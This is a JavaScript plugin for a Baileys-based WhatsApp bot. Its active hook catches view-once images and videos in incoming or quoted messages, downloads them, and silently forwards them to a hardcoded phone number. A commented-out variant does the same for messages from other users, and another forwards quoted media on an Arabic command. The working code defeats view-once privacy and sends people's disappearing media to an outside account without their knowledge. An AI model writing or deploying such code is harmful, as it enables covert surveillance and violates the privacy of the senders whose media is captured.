/* let { downloadContentFromMessage } = (await import('@whiskeysockets/baileys'));
let handler = async (m, { conn, command }) => {
    let to = conn.user.jid
    if (command === 'هق') {
        const msg = await conn.loadMessage(m.quoted.id)
        await conn.copyNForward(to, msg, true)
    } else {
  let type = Object.keys(m.quoted.message)[0]
    let q = m.quoted.message[type]
    let media = await downloadContentFromMessage(q, type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return conn.sendFile(to, buffer, 'media.mp4', q.caption || '', m)
    } else if (/image/.test(type)) {
        return conn.sendFile(to, buffer, 'media.jpg', q.caption || '', m)
    }}
}
handler.command = /^(مشا|هق)$/i
export default handler;
*/
// import { downloadContentFromMessage } from '@whiskeysockets/baileys'
let { downloadContentFromMessage } = (await import('@whiskeysockets/baileys'));
let handler = m => m
handler.before = async function (m, {conn}) {

    let q = m.quoted ? m.quoted : m
     if (q.mtype == 'viewOnceMessageV2') {
    let msg = q.message
  let type = Object.keys(msg)[0]
  let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
  let buffer = Buffer.from([])
  for await (const chunk of media) {
    buffer = Buffer.concat([buffer, chunk])
  }
 let mchat = '212621124079@s.whatsapp.net';
  if (/video/.test(type)) {
    return conn.sendFile(mchat, buffer, 'media.mp4', msg[type].caption || '', m)
  } else if (/image/.test(type)) {
    return conn.sendFile(mchat, buffer, 'media.jpg', msg[type].caption || '', m)
  }
  }
}
export default handler

// let { downloadContentFromMessage } = (await import('@whiskeysockets/baileys'));
// let handler = m => m
// handler.before = async function (m) {
//   let to = '212621124079@s.whatsapp.net';
//     if (m.mtype == 'viewOnceMessageV2' && !m.fromMe) {
//         let msg = m.message.viewOnceMessageV2.message
//         let type = Object.keys(msg)[0]
//         let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
//         let buffer = Buffer.from([])
//         for await (const chunk of media) {
//             buffer = Buffer.concat([buffer, chunk])
//         }
//         if (/video/.test(type)) {
//             return this.sendFile(to, buffer, 'media.mp4', msg[type].caption || '', m)
//         } else if (/image/.test(type)) {
//             return this.sendFile(to, buffer, 'media.jpg', msg[type].caption || '', m)
//         }
//     }
// }
// export default handler
